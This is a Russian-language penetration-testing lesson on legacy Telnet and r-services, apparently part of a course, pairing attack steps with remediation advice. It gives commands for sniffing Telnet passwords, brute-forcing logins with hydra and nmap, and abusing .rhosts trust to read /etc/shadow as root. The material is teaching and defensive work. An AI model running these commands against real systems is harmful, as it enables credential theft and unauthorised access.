Telnet и r-services — наследие до-SSH эпохи. Они передают данные и пароли **без шифрования**, а r-services ещё и доверяют хостам по спискам. В сети с таким оборудованием перехват и обход аутентификации — вопрос нескольких команд. Урок продолжает [`network-module-services`](network-module-services).

## Telnet: доступ без шифрования

**Telnet** (23/tcp) — протокол удалённого терминала. Все данные, включая логин и пароль, идут в открытом виде. Помимо доступа к хостам, Telnet часто открыт на сетевом оборудовании (коммутаторы, роутеры).

```bash
# Подключиться и увидеть баннер
nc -nv 10.0.0.1 23
telnet 10.0.0.1
# NSE-скрипты
nmap -p 23 --script telnet-ntlm-info,telnet-brute 10.0.0.1
```

## Перехват Telnet-сессии

Так как Telnet не шифрует, пароли видны в дампе. Это классическая задача в PCAP и на живом канале.

```bash
# Захват и поиск пароля
sudo tcpdump -i eth0 -nn -w telnet.pcap 'tcp port 23'
tshark -r telnet.pcap -z follow,tcp,ascii,0 | head -60
# Поиск типовых строк логина/пароля
strings telnet.pcap | grep -iE 'login|password'
```

## r-services: rlogin, rsh, rexec

- **rlogin** (513) — удалённый вход;
- **rsh** (514) — удалённое выполнение команд;
- **rexec** (512) — удалённое выполнение с паролем.

Их особенность — **доверие по хостам** через `~/.rhosts` и `/etc/hosts.equiv`: если хост в списке, вход без пароля. Ошибка конфигурации (например, `+` в `.rhosts`) открывает доступ всем.

```bash
# rlogin/rsh
rlogin 10.0.0.1 -l root
rsh 10.0.0.1 -l root id
# NSE
nmap -p 512,513,514 --script rlogin-brute 10.0.0.1
```

## Доверие по .rhosts: эксплуатация

Если на хосте есть `~/.rhosts` со строкой `+ +`, любой пользователь с любого хоста войдёт без пароля. Проверить и использовать:

```bash
# Проверить доступ (если rsh открыт)
rsh -l root 10.0.0.1 'id; cat /etc/hosts.equiv; cat ~/.rhosts'
# При доверии — команда выполнится без пароля
rsh -l root 10.0.0.1 'cat /etc/shadow'
```

## Практика: обнаружить и использовать legacy

```bash
# 1. Сканировать legacy-порты
nmap -sV -p 23,512,513,514 10.0.0.1
# 2. Проверить анонимное/безпарольное доверие
rsh 10.0.0.1 id 2>&1 | head
# 3. Перехватить Telnet
sudo tcpdump -i eth0 -nn -A 'tcp port 23' -c 50 | grep -iE 'login|password'
# 4. Брутфорс Telnet (малый список)
hydra -L users.txt -P pass.txt telnet://10.0.0.1
```

## Частые ошибки

- **Оставлять Telnet на оборудовании** — пароли в открытом виде.
- **Игнорировать `.rhosts`** — безпарольный вход.
- **Считать r-services «редкими»** — на legacy-системах живы.
- **Не перехватывать Telnet** — пароль «бесплатно» лежит в дампе.
- **Путать порты 512/513/514** — rexec/rlogin/rsh.
- **Не проверять trust-файлы** — обход аутентификации.
- **Забывать про баннеры** — они раскрывают ОС/версию.

## Практика: перехват Telnet и доверие r-services

```bash
# 1. Перехватить Telnet-сессию
sudo tcpdump -i eth0 -nn -w telnet.pcap 'tcp port 23'
# 2. Follow TCP-поток и найти креды
tshark -r telnet.pcap -z follow,tcp,ascii,0 -q | grep -iE 'login|password' | head
# 3. Быстрый поиск по сырому дампу
strings telnet.pcap | grep -iE 'login|password|user' | head
# 4. Проверить доверие r-services
rsh -l root 10.0.0.1 'id; cat /etc/hosts.equiv; cat ~/.rhosts' 2>&1 | head
# 5. Обнаружить legacy-порты
nmap -sV -p 23,512,513,514 10.0.0.1
```

## Сравнение legacy-сервисов

| Сервис | Порт | Шифрование | Особенность |
|---|---|---|---|
| Telnet | 23 | нет | пароли в открытом виде |
| rlogin | 513 | нет | доверие .rhosts |
| rsh | 514 | нет | команды без пароля при доверии |
| rexec | 512 | нет | пароль, но открыто |
| SSH | 22 | да | современная замена |

## Чек-лист legacy-доступа

1. Остался ли **Telnet** (23) на хостах/оборудовании?
2. Открыты ли **r-services** (512–514)?
3. Есть ли файлы **`.rhosts`/`hosts.equiv`** с широким доверием?
4. Используется ли **SSH** вместо них?
5. Сегментирован ли **management**-доступ?
6. Мониторятся ли **legacy-порты**?
7. Обновлены ли **баннеры/версии**?

```bash
# Поиск опасного доверия
rsh 10.0.0.1 'cat ~/.rhosts 2>/dev/null; cat /etc/hosts.equiv 2>/dev/null'
```

Вывод: Telnet и r-services — чистый legacy без шифрования и с опасным доверием. Их нужно заменять на SSH, удалять trust-файлы и сегментировать управляющий доступ.

## Дополнительно: баннеры и брутфорс

```bash
# Баннеры legacy-сервисов
nmap -sV -p 23,512,513,514 --version-all 10.0.0.1
# Telnet-брутфорс (малый список!)
hydra -L users.txt -P small.txt telnet://10.0.0.1
# NSE для r-services
nmap -p 512,513,514 --script rlogin-brute 10.0.0.1
# Проверить доверие без пароля
rsh -l root 10.0.0.1 id 2>&1
```

Баннеры Telnet/r-services раскрывают ОС и версию, а доверие `.rhosts` может дать вход без пароля.

## Итог по legacy-доступу

Telnet и r-services — технологии до-SSH эпохи:

- **нет шифрования** — пароли и команды в открытом виде;
- **доверие по хостам** — `.rhosts`/`hosts.equiv` обходят пароль;
- **часто на оборудовании** — коммутаторы, роутеры, старые серверы.

Практический вывод: если вы видите Telnet или r-services — это гарантированный вектор (перехват или безпарольный вход). Защита — заменить на SSH, удалить trust-файлы, сегментировать управляющий доступ и мониторить legacy-порты.

## Заметка о баннерах и фингерпринте

Баннер — первое, что отдаёт сервис, и часто он раскрывает больше, чем нужно: ОС, версию, вендора, иногда внутреннее имя.

```bash
# Собрать баннеры
nmap -sV --version-all -p 23,512,513,514 10.0.0.1
# Ручной захват
for p in 23 513 514; do echo "== $p"; timeout 3 nc -nv 10.0.0.1 $p </dev/null 2>&1 | head -3; done
```

Практический вывод: баннеры — бесплатная разведка. По ним подбирают CVE и уточняют ОС. Защита — минимизировать баннер (не раскрывать версию), отключать лишние сервисы и сегментировать управляющий доступ.

## Заметка о миграции на SSH

Переход с Telnet/r-services на SSH — стандартная рекомендация, но важно сделать его безопасно:

- **отключить** Telnet и r-services на всех хостах и оборудовании;
- **удалить** `.rhosts`, `hosts.equiv`, `shosts` и подобные trust-файлы;
- настроить **SSH-ключи** и отключить парольную аутентификацию, где возможно;
- ограничить SSH по **IP/сети** и включить **MFA**;
- вести **аудит** входов и команд.

```bash
# Найти остатки legacy на хосте
ss -tlnp | grep -E ':23|:512|:513|:514'
ls -la ~/.rhosts /etc/hosts.equiv 2>/dev/null
```

Практический вывод: legacy-сервисы не должны существовать в современной сети. Их наличие — это либо забытая конфигурация, либо требование старого оборудования; и то, и другое нужно планово устранять, начиная с management-сегмента.
